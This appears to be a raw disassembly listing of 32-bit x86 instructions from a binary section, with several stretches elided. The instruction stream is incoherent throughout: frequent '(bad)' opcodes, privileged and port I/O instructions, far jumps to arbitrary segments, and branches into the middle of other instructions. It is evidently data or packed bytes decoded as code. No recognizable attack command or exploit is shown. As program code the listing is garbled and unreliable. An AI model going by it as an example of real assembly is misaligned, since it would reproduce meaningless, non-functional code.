  414e9e:	cwde   
  414e9f:	xchg   BYTE PTR [edi-0x1b],cl
  414ea2:	push   ds
  414ea3:	mov    WORD PTR [edx],?
  414ea5:	mov    bl,0xf2
  414ea7:	fstp   DWORD PTR [eax-0x75]
  414eaa:	sahf   
  414eab:	push   ebx
  414eac:	or     ch,ah
  414eae:	scas   al,BYTE PTR es:[edi]
  414eaf:	cmp    eax,0x2217fdd
  414eb4:	xchg   ebp,eax
  414eb5:	pop    ss
  414eb6:	add    cl,0x95
  414eb9:	jle    0x414ec1
  414ebb:	sbb    DWORD PTR [ecx+0x72],eax
  414ebe:	ins    BYTE PTR es:[edi],dx
  414ebf:	(bad)  [ebp-0x147472c1]
  414ec5:	pushf  
  414ec6:	pop    es
  414ec7:	cmp    ch,BYTE PTR [ebp+0x10]
  414eca:	xchg   edx,eax
  414ecb:	mov    ebx,DWORD PTR ds:0x358f760c
  414ed1:	mov    WORD PTR [eax+edx*2],cs
  414ed4:	int3   
  414ed5:	sahf   
  414ed6:	mov    ebp,0x66cebda
  414edb:	cmp    ecx,ebp
  414edd:	fscale 
  414edf:	dec    ebx
  414ee0:	je     0x414eca
  414ee2:	ret    0x85d7
  414ee5:	loopne 0x414f2a
  414ee7:	cmp    dl,BYTE PTR [edx+0x7614abe]
  414eed:	fistp  WORD PTR [edx+0x5e]
  414ef0:	(bad)  
  414ef1:	cmp    ebx,DWORD PTR [ebp-0x7146049e]
  414ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ef8:	jno    0x414f43
  414efa:	add    al,0xd4
  414efc:	fsub   st(2),st
  414efe:	push   es
  414eff:	ret    0x5dd8
  414f02:	sbb    edi,DWORD PTR [ebp+0x1b2e97f0]
  414f08:	aaa    
  414f09:	jge    0x414ed4
  414f0b:	ffree  st(4)
  414f0d:	pop    ebx
  414f0e:	cvtpi2ps xmm6,QWORD PTR [ecx+0x0]
	...
  414f72:	add    BYTE PTR [eax],al
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0xbb3e0525
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0xe0000001
  414f8d:	jmp    0xd7f6:0xcdd88b4c
  414f94:	or     al,bl
  414f96:	out    0xd5,al
  414f98:	push   edi
  414f99:	sbb    ch,BYTE PTR [ebx]
  414f9b:	cwde   
  414f9c:	jns    0x415019
  414f9e:	aaa    
  414f9f:	dec    edx
  414fa0:	clc    
  414fa1:	dec    ecx
  414fa2:	add    BYTE PTR [esi+0x4de5bb2a],bh
  414fa8:	push   esi
  414fa9:	mov    ebp,0xf8f77286
  414fae:	mov    bh,0x56
  414fb0:	dec    ebx
  414fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fb2:	inc    edi
  414fb3:	pop    ss
  414fb4:	jno    0x415029
  414fb6:	in     eax,0xf6
  414fb8:	int    0xb3
  414fba:	sub    al,0x69
  414fbc:	sbb    al,0xe5
  414fbe:	fidivr DWORD PTR [edi+0x59]
  414fc1:	dec    ebx
  414fc2:	mov    dl,0x46
  414fc4:	stos   BYTE PTR es:[edi],al
  414fc5:	jmp    0x85991265
  414fca:	mov    ds:0xea6a158c,eax
  414fcf:	and    cl,ah
  414fd1:	cmp    dh,BYTE PTR [ebx]
  414fd3:	dec    edx
  414fd4:	push   ss
  414fd5:	pop    esp
  414fd6:	xlat   BYTE PTR ds:[ebx]
  414fd7:	stc    
  414fd8:	(bad)
  414fdc:	loop   0x415042
  414fde:	nop
  414fdf:	test   eax,0x18cde837
  414fe4:	jmp    0xfe9ac1d0
  414fe9:	dec    edx
  414fea:	push   cs
  414feb:	pop    ebp
  414fec:	adc    DWORD PTR [edi-0xb],eax
  414fef:	cs mov edx,0x5cc8ab99
  414ff5:	inc    esi
  414ff6:	das    
  414ff7:	loope  0x414fc5
  414ff9:	iret   
  414ffa:	mov    esp,DWORD PTR [esi+0x5626a0a8]
  415000:	mov    ch,0xa2
  415002:	call   FWORD PTR [eax+0x288b8a75]
  415008:	bound  ebx,QWORD PTR [ebx-0x7d]
  41500b:	dec    edi
  41500c:	shr    al,0x8c
  41500f:	sbb    eax,0x7629e83d
  415014:	inc    edx
  415015:	inc    ebx
  415016:	ins    DWORD PTR es:[edi],dx
  415017:	sub    eax,0xc228d4b
  41501c:	shl    DWORD PTR [ecx-0x6a],0xcb
  415020:	push   edi
  415021:	xor    al,0xa5
  415023:	ja     0x415000
  415025:	mov    ?,WORD PTR [edi+0x2862ad6c]
  41502b:	push   cs
  41502c:	lock sub BYTE PTR [ebp+0x651a523d],dl
  415033:	aaa    
  415034:	leave  
  415035:	sbb    eax,0x2b513522
  41503a:	xchg   ebp,eax
  41503b:	popf   
  41503c:	dec    edi
  41503d:	pop    edi
  41503e:	mov    ecx,0x27ad2399
  415043:	xchg   ebp,eax
  415044:	xor    DWORD PTR [ebx-0x11b72720],0xa067113d
  41504e:	or     ah,bh
  415050:	inc    ebx
  415051:	cmp    eax,0x5eea6428
  415056:	sbb    eax,0x928cf967
  41505b:	(bad)  
  41505d:	clc    
  41505e:	repnz lock sar BYTE PTR [edi-0x27677bf0],0x2c
  415067:	sbb    dh,BYTE PTR [ecx-0x2b]
  41506a:	inc    edx
  41506b:	jmp    0xf8eb:0x4b1d42c6
  415072:	mov    edx,0xc6bd5abe
  415077:	std    
  415078:	mov    ebx,0xcb2184fa
  41507d:	jg     0x415020
  41507f:	mov    DWORD PTR [ebx-0x23],ebp
  415082:	and    DWORD PTR [edx],esi
  415084:	loopne 0x4150cf
  415086:	les    esi,FWORD PTR [ecx]
  415088:	ss jl  0x415103
  41508b:	mov    eax,DWORD PTR [ebx+0xe]
  41508e:	fdiv   DWORD PTR [ecx+0x49]
	...
  4150f1:	add    BYTE PTR [eax],al
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x1a5cfc2d
  415102:	jmp    0x4150cc
  415104:	sbb    dh,bl
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0xe7000001
  41510d:	mov    dl,0x58
  41510f:	cli    
  415110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415111:	std    
  415112:	inc    edx
  415113:	pop    es
  415114:	scas   eax,DWORD PTR es:[edi]
  415115:	in     eax,dx
  415116:	and    al,0x98
  415118:	add    ah,BYTE PTR [edi-0x45]
  41511b:	fcomp  DWORD PTR [edi+0x5ee09a48]
  415121:	icebp  
  415122:	in     al,0x48
  415124:	std    
  415125:	pop    edx
  415126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415127:	xor    ebp,DWORD PTR [ebp+0x3231e9bb]
  41512d:	and    ebp,ebp
  41512f:	ret    
  415130:	fcom   QWORD PTR [esi-0x7c86e4d8]
  415136:	mov    edi,0xcd3f604c
  41513b:	pop    ebp
  41513c:	das    
  41513d:	jecxz  0x415151
  41513f:	into   
  415140:	retf   
  415141:	or     eax,ecx
  415143:	cli    
  415144:	pop    esi
  415145:	and    eax,0x997bdbdf
  41514a:	pop    esi
  41514b:	out    0x5d,al
  41514d:	mov    WORD PTR [ecx+0x71],gs
  415150:	jbe    0x41518a
  415152:	push   ds
  415153:	mov    dh,0xc3
  415155:	adc    BYTE PTR [edi],bl
  415157:	push   ebp
  415158:	and    BYTE PTR [esi+0x62],cl
  41515b:	mov    eax,ebp
  41515d:	xchg   edi,eax
  41515e:	imul   edi,esp,0x1
  415161:	pop    es
  415162:	retf   0x7e1a
  415165:	sub    esi,DWORD PTR [ecx-0x774f7366]
  41516b:	and    DWORD PTR [edi-0x3549171d],ebx
  415171:	pop    eax
  415172:	outs   dx,BYTE PTR ds:[esi]
  415173:	bndldx bnd3,[esi]
  415176:	dec    esi
  415177:	adc    ecx,DWORD PTR [edi+0x4a4115d9]
  41517d:	icebp  
  41517e:	fild   DWORD PTR [edx+0x4cd9a3eb]
  415184:	sub    al,bl
  415186:	lahf   
  415187:	fcom   QWORD PTR [ebp+edx*8-0x6d]
  41518b:	pop    ds
  41518c:	or     ebp,DWORD PTR [ebx]
  41518e:	loope  0x41517c
  415190:	mov    dl,BYTE PTR [ebx+eax*2]
  415193:	mov    cl,0xe1
  415195:	xchg   edx,eax
  415196:	fwait
  415197:	adc    DWORD PTR [eax-0x77],edx
  41519a:	or     eax,DWORD PTR [eax+eiz*1-0x4356dab9]
  4151a1:	aaa    
  4151a2:	nop
  4151a3:	or     DWORD PTR [ecx-0x6347768d],0xfffffff1
  4151aa:	imul   edi,DWORD PTR ds:0xad9a9d75,0xffffffa6
  4151b1:	fmul   st,st(5)
  4151b3:	lahf   
  4151b4:	int3   
  4151b5:	fld    QWORD PTR [ecx+0x6e]
  4151b8:	jmp    0xbc59:0x3dc6e376
  4151bf:	leave  
  4151c0:	adc    al,0x8e
  4151c2:	addr16 mov esp,0x1a29ad22
  4151c8:	ret    0x7d9d
  4151cb:	push   0x30acd9c4
  4151d0:	inc    edx
  4151d1:	pop    es
  4151d2:	or     eax,DWORD PTR [ebp+0x5ad93dbf]
  4151d8:	out    0x71,al
  4151da:	jg     0x4151ed
  4151dc:	xor    eax,edx
  4151de:	push   0x2cf3b0cb
  4151e3:	push   edi
  4151e4:	jmp    0x8cd00ba0
  4151e9:	imul   esp,DWORD PTR [edi+0x75],0xc18bfcc0
  4151f0:	(bad)  
  4151f1:	xchg   edx,eax
  4151f2:	ret    
  4151f3:	lods   eax,DWORD PTR ds:[esi]
  4151f4:	bnd jp 0x415221
  4151f7:	pusha  
  4151f8:	mov    esp,DWORD PTR [edx]
  4151fa:	ss mov ebp,0x167987c8
  415200:	add    edi,DWORD PTR [edx+0x11]
  415203:	mov    ah,0xbf
  415205:	jmp    0x99a7:0x37a8c9af
  41520c:	pop    ds
  41520d:	pop    eax
  41520e:	push   esi
  41520f:	call   0x0:0x72
	...
  415272:	add    BYTE PTR [eax],al
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x47df540b
  415283:	ret    0xdf1d
  415286:	add    BYTE PTR [eax],al
  415288:	add    eax,0xda000001
  41528d:	cmp    eax,0x8636924
  415292:	xor    al,0x2a
  415294:	(bad)  
  415296:	ss sub bh,cl
  415299:	mov    edi,ecx
  41529b:	out    0xca,eax
  41529d:	mov    ebx,0x6c91b3d9
  4152a2:	and    BYTE PTR [esp+ecx*2-0x67],bl
  4152a6:	ss data16 hlt 
  4152a9:	ss cmp al,0x12
  4152ac:	jb     0x415290
  4152ae:	xor    bl,BYTE PTR [esi+0x2375403d]
  4152b4:	cdq    
  4152b5:	pusha  
  4152b6:	fadd   DWORD PTR [ebx-0x2e]
  4152b9:	dec    ebp
  4152ba:	(bad)  
  4152bb:	nop
  4152bc:	fcmovnb st,st(3)
  4152be:	leave  
  4152bf:	pop    eax
  4152c0:	jmp    0xdfef2208
  4152c5:	pop    edi
  4152c6:	test   eax,0x67d6e4da
  4152cb:	push   DWORD PTR [esi+eax*8-0x422cfe12]
  4152d2:	clc    
  4152d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d4:	mov    ebp,0x97e9bba7
  4152d9:	xchg   edi,eax
  4152da:	mov    eax,ds:0x6c1abb2e
  4152df:	mov    ebx,edx
  4152e1:	inc    ecx
  4152e2:	lods   al,BYTE PTR ds:[si]
  4152e4:	jmp    0x41526e
  4152e6:	retf   0x68a6
  4152e9:	push   es
  4152ea:	and    DWORD PTR [eax+0x6334aa1c],0xe7f84bfa
  4152f4:	ffreep st(4)
  4152f6:	rsqrtps xmm4,XMMWORD PTR [edi+edi*1-0x38453c62]
  4152fe:	hlt    
  4152ff:	mov    dh,0x78
  415301:	cmp    DWORD PTR [edx-0x7b],edi
  415304:	int3   
  415305:	xchg   edi,eax
  415306:	out    dx,al
  415307:	test   al,0xc8
  415309:	or     BYTE PTR [ecx],cl
  41530b:	mov    esp,es
  41530d:	fld    DWORD PTR [ecx+0x35]
  415310:	(bad)  
  415311:	je     0x4152a2
  415313:	fisubr DWORD PTR [eax-0x36]
  415316:	pop    ebx
  415317:	xchg   BYTE PTR [ecx],cl
  415319:	push   ebx
  41531a:	xchg   edx,eax
  41531b:	fild   WORD PTR [bx+di]
  41531e:	cmp    dl,ah
  415320:	js     0x41530b
  415322:	jmp    0x4152e8
  415324:	jnp    0x4152f5
  415326:	sub    ch,bh
  415328:	jae    0x4152b5
  41532a:	xor    DWORD PTR [ebp+eiz*4-0x4d],edx
  41532e:	xlat   BYTE PTR ds:[ebx]
  41532f:	popf   
  415330:	(bad)  
  415331:	sbb    eax,0xa3bde288
  415336:	pop    esi
  415337:	sti    
  415338:	cmp    edi,esp
  41533a:	mov    ecx,0xfd8b3b5d
  41533f:	and    ebp,DWORD PTR [eax-0x25]
  415342:	jge    0x41534e
  415344:	mov    edx,0xad05040e
  415349:	jg     0x41531c
  41534b:	popf   
  41534c:	mov    edx,DWORD PTR [edi-0x69df1309]
  415352:	shl    DWORD PTR [edi],1
  415354:	aad    0x5a
  415356:	and    eax,0xe78e83f5
  41535b:	jge    0x41537f
  41535d:	push   0x19
  41535f:	cmp    ch,ch
  415361:	cdq    
  415362:	push   edi
  415363:	fadd   QWORD PTR [ebp+edi*8+0x1053afbb]
  41536a:	ins    DWORD PTR es:[edi],dx
  41536b:	jecxz  0x415328
  41536d:	inc    esp
  41536e:	imul   DWORD PTR [ecx+0x28943ff8]
  415374:	in     al,0x9a
  415376:	sub    BYTE PTR [ebp-0x6f],dh
  415379:	cmp    DWORD PTR [edi-0x42],0xffffffb1
  41537d:	mov    eax,ds:0x920d692d
  415382:	ret    
  415383:	cmp    eax,0xeb6d2ac3
  415388:	pushf  
  415389:	hlt    
  41538a:	jb     0x415338
  41538c:	cmp    BYTE PTR [ebp+edi*4+0x446f],ch
	...
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x2ed3e5b0
  415401:	mov    al,ds:0xe0229cc5
  415406:	add    BYTE PTR [eax],al
  415408:	add    eax,0xf3000001
  41540d:	mov    al,ds:0xb2031812
  415412:	rol    DWORD PTR [ecx+0x20b59938],1
  415418:	inc    edx
  415419:	add    esi,esi
  41541b:	dec    ecx
  41541c:	nop
  41541d:	data16 test BYTE PTR [esi-0x6c280307],bl
  415424:	xchg   esp,eax
  415425:	inc    eax
  415426:	mov    ebx,0x2717fabf
  41542b:	dec    esi
  41542c:	sub    ah,BYTE PTR [esi-0x29a7c79e]
  415432:	sbb    ebx,DWORD PTR [ebx]
  415434:	inc    ebp
  415435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415436:	sub    esi,DWORD PTR [edi+0x71]
  415439:	mov    BYTE PTR [eax+0x39e94736],cl
  41543f:	push   0x51
  415441:	sbb    DWORD PTR [edx],edi
  415443:	pop    eax
  415444:	lock (bad) 
  415446:	scas   al,BYTE PTR es:[edi]
  415447:	mov    dl,0xb1
  415449:	outs   dx,BYTE PTR ds:[esi]
  41544a:	aas    
  41544b:	scas   al,BYTE PTR es:[edi]
  41544c:	adc    BYTE PTR [edx+0x175d3d08],dl
  415452:	or     eax,0xff5a9f52
  415457:	(bad)  
  415458:	pop    ss
  415459:	xlat   BYTE PTR ds:[ebx]
  41545a:	jns    0x4153ed
  41545c:	fnstcw WORD PTR [eax]
  41545e:	daa    
  41545f:	push   0xfffffff5
  415461:	jnp    0x415490
  415463:	adc    DWORD PTR [eax],0x19396012
  415469:	fmul   DWORD PTR [ecx+ecx*4-0x56]
  41546d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41546f:	repz dec esi
  415471:	mov    DWORD PTR [ebp+0x225b9ae0],ebp
  415477:	dec    eax
  415478:	icebp  
  415479:	inc    esp
  41547a:	pop    esp
  41547b:	lock stos BYTE PTR es:[edi],al
  41547d:	jns    0x4154ea
  41547f:	xor    dl,BYTE PTR [ebp-0x33]
  415482:	xor    edi,DWORD PTR [edx-0x7c]
  415485:	js     0x4154b8
  415487:	arpl   WORD PTR [esi-0x22],si
  41548a:	(bad)  
  41548c:	out    dx,eax
  41548d:	pop    edi
  41548e:	sti    
  41548f:	ds mov esi,0xcb731e65
  415495:	and    DWORD PTR [esi-0x47f35ac0],ebp
  41549b:	mov    ecx,0xbbc7654d
  4154a0:	bound  edi,QWORD PTR [edx+0x37]
  4154a3:	daa    
  4154a4:	mov    ss:0x7679f92d,al
  4154aa:	xor    ebx,esp
  4154ac:	or     BYTE PTR [edx-0x5f1f9de0],dl
  4154b2:	sub    al,ch
  4154b4:	out    0xb4,al
  4154b6:	adc    eax,0xacf4af65
  4154bb:	test   cl,dh
  4154bd:	cli    
  4154be:	mov    dh,0xe0
  4154c0:	push   edi
  4154c1:	sbb    esp,esp
  4154c3:	inc    esp
  4154c4:	ins    DWORD PTR es:[edi],dx
  4154c5:	and    BYTE PTR [edi+0x5c20d9ad],ch
  4154cb:	cs mov edx,0xe0ffcc3a
  4154d1:	shr    DWORD PTR [edx-0x292a962],1
  4154d7:	and    BYTE PTR [eax+0x2ff5444],0xc
  4154de:	push   0xf66def19
  4154e3:	xchg   edx,eax
  4154e4:	mov    cl,ch
  4154e6:	icebp  
  4154e7:	adc    ebx,esi
  4154e9:	popf   
  4154ea:	repnz pop ebx
  4154ec:	dec    BYTE PTR [ebp-0x53]
  4154ef:	cmp    BYTE PTR [ebp-0x5afea0a],dh
  4154f5:	pop    es
  4154f6:	out    0x5e,al
  4154f8:	inc    edx
  4154f9:	gs inc ebp
  4154fb:	jecxz  0x415541
  4154fd:	mov    eax,ds:0x968e68d8
  415502:	lahf   
  415503:	xor    DWORD PTR [edx],ebx
  415505:	iret   
  415506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415507:	imul   BYTE PTR [eax+eiz*1+0x6c176178]
  41550e:	sub    BYTE PTR [esi],dh
  415510:	sub    DWORD PTR [eax],eax
	...
  415572:	add    BYTE PTR [eax],al
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x41551e
  415581:	xor    eax,0xe127e1a4
  415586:	add    BYTE PTR [eax],al
  415588:	add    eax,0x5c000001
  41558d:	push   ebp
  41558e:	xchg   edi,eax
  41558f:	jne    0x415555
  415591:	cmp    edi,0x58bc19db
  415597:	repz inc ecx
  415599:	inc    eax
  41559a:	dec    DWORD PTR [ecx+0x74]
  41559d:	and    DWORD PTR [ebx-0x64],esp
  4155a0:	cmp    ah,BYTE PTR [ebx-0x8]
  4155a3:	xchg   edi,eax
  4155a4:	fnstcw WORD PTR [ebx-0x42]
  4155a7:	mov    al,ds:0xcad23b03
  4155ac:	das    
  4155ad:	pop    ecx
  4155ae:	mov    esi,0xcdca920a
  4155b3:	in     al,dx
  4155b4:	out    dx,al
  4155b5:	push   ecx
  4155b6:	jp     0x41556a
  4155b8:	push   edx
  4155b9:	bound  edi,QWORD PTR [ebp-0x17fdb4ce]
  4155bf:	call   DWORD PTR [ebx]
  4155c1:	shl    BYTE PTR [ecx],0x26
  4155c4:	out    0x19,al
  4155c6:	loop   0x415584
  4155c8:	out    dx,al
  4155c9:	cdq    
  4155ca:	loop   0x4155bc
  4155cc:	dec    edx
  4155cd:	add    DWORD PTR [ecx],esi
  4155cf:	cmp    al,0xbd
  4155d1:	xor    al,0xb7
  4155d3:	inc    esi
  4155d4:	out    dx,eax
  4155d5:	fadd   QWORD PTR [eax-0x42cb11b3]
  4155db:	jp     0x4155f9
  4155dd:	fs in  eax,dx
  4155df:	sub    eax,0x6ed48877
  4155e4:	cmp    eax,0xa5a19907
  4155e9:	loopne 0x415655
  4155eb:	ror    BYTE PTR [esi+0x53],cl
  4155ee:	push   edx
  4155ef:	push   ebx
  4155f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155f1:	scas   eax,DWORD PTR es:[edi]
  4155f2:	xor    cl,BYTE PTR [edi-0x6b]
  4155f5:	stos   DWORD PTR es:[edi],eax
  4155f6:	adc    al,0xe3
  4155f8:	mov    ds:0xcb38f426,al
  4155fd:	pushf  
  4155fe:	or     esp,edi
  415600:	repnz lods eax,DWORD PTR ds:[esi]
  415602:	lds    esi,FWORD PTR [esi+edx*1]
  415605:	jb     0x415665
  415607:	scas   al,BYTE PTR es:[edi]
  415608:	out    dx,al
  415609:	ss (bad) 
  41560b:	mov    ebx,0x7860831d
  415610:	int    0x22
  415612:	and    esi,esp
  415614:	sub    BYTE PTR [ebp+edi*1-0x57],dh
  415618:	outs   dx,DWORD PTR ds:[esi]
  415619:	jbe    0x4155c1
  41561b:	icebp  
  41561c:	inc    ecx
  41561d:	sub    BYTE PTR [ebp+0x30e01a1c],dh
  415623:	and    eax,0x6ce386bd
  415628:	pop    ecx
  415629:	(bad)  
  41562a:	(bad)  
  41562b:	pop    ds
  41562c:	(bad)  
  41562d:	cmp    cl,bh
  41562f:	mov    dh,0x3a
  415631:	inc    esi
  415632:	mov    ebx,0x81da379
  415637:	inc    edi
  415638:	scas   eax,DWORD PTR es:[edi]
  415639:	cli    
  41563a:	add    ah,dl
  41563c:	mov    al,0x1b
  41563e:	and    al,bh
  415640:	(bad)  
  415641:	and    BYTE PTR [edx-0x48335621],cl
  415647:	call   0x4430:0x591cacfa
  41564e:	mov    BYTE PTR [eax],cl
  415650:	push   ss
  415651:	fs std 
  415653:	sbb    dh,bl
  415655:	adc    eax,0xaddbd3a8
  41565a:	mov    al,ds:0xec5816ad
  41565f:	mov    DWORD PTR [edi+0x2d95b188],ebx
  415665:	sub    eax,0x87bff327
  41566a:	push   es
  41566b:	loopne 0x415622
  41566d:	mov    ebp,0x91dda219
  415672:	rcl    BYTE PTR [ebp-0x25309e4f],1
  415678:	sbb    DWORD PTR [edx+0x42],ebx
  41567b:	je     0x4156b1
  41567d:	data16 int3 
  41567f:	add    DWORD PTR [edi],0xffffff9b
  415682:	loope  0x4156e1
  415684:	pop    ss
  415685:	and    eax,0xc4e36f1b
  41568a:	retf   
  41568b:	dec    edx
  41568c:	jp     0x4156f2
  41568e:	jecxz  0x4156d0
  415690:	mov    ah,0x0
	...
  4156f2:	add    BYTE PTR [eax],al
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0xe4
  415701:	inc    edi
  415702:	fbstp  TBYTE PTR [edi]
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0x90000001
  41570d:	pop    esi
  41570e:	sbb    al,0x7b
  415710:	into   
  415711:	jnp    0x4156a3
  415713:	dec    esi
  415714:	(bad)  
  415715:	retf   0x81e4
  415718:	jl     0x415710
  41571a:	and    BYTE PTR [esi-0x19f5e062],bh
  415720:	inc    ecx
  415721:	inc    edi
  415722:	add    al,0xc8
  415724:	push   ecx
  415725:	mov    ecx,0xecfad565
  41572a:	add    BYTE PTR [ebx],0x8e
  41572d:	xor    cl,BYTE PTR [esi+0x30e70978]
  415733:	loopne 0x415718
  415735:	jno    0x415710
  415737:	fcomp  st(5)
  415739:	inc    esp
  41573a:	dec    ebx
  41573b:	xchg   ecx,eax
  41573c:	and    eax,0xba9da703
  415741:	fld    QWORD PTR [ebx]
  415743:	in     eax,0xea
  415745:	leave  
  415746:	and    BYTE PTR [esi+edx*1-0x22],bl
  41574a:	inc    ecx
  41574b:	jo     0x415775
  41574d:	(bad)  
  41574e:	bound  edx,QWORD PTR [ebx]
  415750:	out    dx,eax
  415751:	pop    esp
  415752:	sub    bl,dh
  415754:	or     DWORD PTR [edx-0x78],esi
  415757:	xor    al,0xce
  415759:	jnp    0x415790
  41575b:	adc    al,0x55
  41575d:	add    edi,DWORD PTR [ebp+0x78a6230c]
  415763:	rep stos BYTE PTR es:[edi],al
  415765:	shr    DWORD PTR [esi-0x1d],0x49
  415769:	push   eax
  41576a:	mov    ebx,0x4c428473
  41576f:	pushf  
  415770:	loop   0x4157e0
  415772:	mov    WORD PTR [ebp-0x7e06383c],?
  415778:	and    esp,DWORD PTR [ebx+0x8]
  41577b:	popa   
  41577c:	retf   0x5aee
  41577f:	into   
  415780:	sti    
  415781:	mov    ah,0xf7
  415783:	inc    edx
  415784:	in     eax,0x34
  415786:	push   0xffffffcf
  415788:	xlat   BYTE PTR ds:[ebx]
  415789:	leave  
  41578a:	fxch   st(7)
  41578c:	jo     0x4157c7
  41578e:	dec    ebx
  41578f:	jp     0x41576d
  415791:	frstor [edx+edi*8+0x43c88241]
  415798:	fmul   DWORD PTR [ebx+0x65]
  41579b:	fisttp QWORD PTR [esi]
  41579d:	pop    eax
  41579e:	adc    esi,eax
  4157a0:	sbb    ch,dh
  4157a2:	(bad)  
  4157a3:	imul   ebx
  4157a5:	sbb    BYTE PTR [ecx-0x6b3fa135],ch
  4157ab:	inc    ebx
  4157ac:	jecxz  0x415763
  4157ae:	mov    bh,0x78
  4157b0:	pop    ecx
  4157b1:	fst    QWORD PTR [eax]
  4157b3:	aas    
  4157b4:	mov    bh,0xb1
  4157b6:	jne    0x4157f7
  4157b8:	inc    esp
  4157b9:	mov    cl,0xd2
  4157bb:	xchg   edx,eax
  4157bc:	xchg   ebp,eax
  4157bd:	test   dl,ch
  4157bf:	mov    ecx,0x9e936b81
  4157c4:	dec    esi
  4157c5:	mov    dh,0xe3
  4157c7:	add    eax,DWORD PTR [eax]
  4157c9:	pop    ebx
  4157ca:	xchg   ah,cl
  4157cc:	jg     0x415844
  4157ce:	jo     0x415792
  4157d0:	ret    0xc735
  4157d3:	and    DWORD PTR [ebx+0x10],edi
  4157d6:	sub    eax,0x2b2a56df
  4157db:	jecxz  0x4157c2
  4157dd:	xchg   ebx,eax
  4157de:	cmc    
  4157df:	xchg   ecx,eax
  4157e0:	mov    ds:0x61b3d493,al
  4157e5:	aam    0x19
  4157e7:	(bad)  
  4157e8:	rcl    BYTE PTR [ebx],0x42
  4157eb:	add    dh,BYTE PTR [eax+0x6a359521]
  4157f1:	pushf  
  4157f2:	icebp  
  4157f3:	shl    DWORD PTR ds:0x67c3746f,cl
  4157f9:	neg    BYTE PTR [edx]
  4157fb:	test   BYTE PTR [esi],bl
  4157fd:	stos   DWORD PTR es:[edi],eax
  4157fe:	jecxz  0x41586e
  415800:	jnp    0x415801
  415802:	mov    ds:0x59c41c09,eax
  415807:	mul    DWORD PTR [eax+0x43]
  41580a:	mov    ch,0xe4
  41580c:	mov    edx,0xa39b04a4
	...
  415871:	add    BYTE PTR [eax],al
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rcr    DWORD PTR [edx+0x52],cl
  415882:	out    0x2b,al
  415884:	xor    ebx,esp
  415886:	add    BYTE PTR [eax],al
  415888:	add    eax,0xe5000001
  41588d:	hlt    
  41588e:	dec    esi
  41588f:	fucomi st,st(5)
  415891:	mov    cl,0xb
  415893:	cwde   
  415894:	xchg   ebp,eax
  415895:	call   0xfb8c6463
  41589a:	inc    ebx
  41589b:	daa    
  41589c:	xchg   esi,eax
  41589d:	(bad)  
  41589e:	fucom  st(2)
  4158a0:	loopne 0x4158b8
  4158a2:	ins    BYTE PTR es:[edi],dx
  4158a3:	pop    ebx
  4158a4:	or     al,0xb8
  4158a6:	dec    esp
  4158a7:	fucom  st(7)
  4158a9:	in     eax,0xdb
  4158ab:	push   ss
  4158ac:	jne    0x4158ce
  4158ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158af:	jmp    0x3ea7d6b2
  4158b4:	js     0x41585f
  4158b6:	gs (bad) 
  4158b8:	mov    fs,WORD PTR [eax-0x9ad9eff]
  4158be:	hlt    
  4158bf:	test   eax,0x7f9c9cba
  4158c4:	lds    edx,FWORD PTR [ebx+eax*1+0x4d1e19c1]
  4158cb:	push   ds
  4158cc:	cmp    bl,al
  4158ce:	arpl   WORD PTR [eax+esi*4+0x47],bx
  4158d2:	mov    ebx,0xf5a9d9b
  4158d7:	inc    ebp
  4158d8:	jl     0x415942
  4158da:	mov    cr4,ebp
  4158dd:	and    eax,0x7356c868
  4158e2:	sti    
  4158e3:	and    ecx,DWORD PTR [esi]
  4158e5:	xlat   BYTE PTR ds:[ebx]
  4158e6:	ret    
  4158e7:	cmp    al,BYTE PTR [esi-0x27]
  4158ea:	aam    0x38
  4158ec:	sub    al,0xe1
  4158ee:	jae    0x4158f0
  4158f0:	pop    ecx
  4158f1:	es cdq 
  4158f3:	in     al,0x11
  4158f5:	or     eax,DWORD PTR [eax+0x6954042e]
  4158fb:	jno    0x41596c
  4158fd:	dec    ecx
  4158fe:	jecxz  0x4158dc
  415900:	push   0x4a
  415902:	in     eax,dx
  415903:	out    dx,eax
  415904:	in     eax,0xde
  415906:	or     BYTE PTR ds:[di+0x761c],bl
  41590c:	in     al,0x63
  41590e:	mov    ebx,eax
  415910:	ins    BYTE PTR es:[edi],dx
  415911:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  415913:	sub    al,0x8
  415915:	jo     0x4158d2
  415917:	lock popf 
  415919:	mov    ecx,DWORD PTR [ebp-0x3519444e]
  41591f:	in     eax,0x63
  415921:	mov    ah,0x75
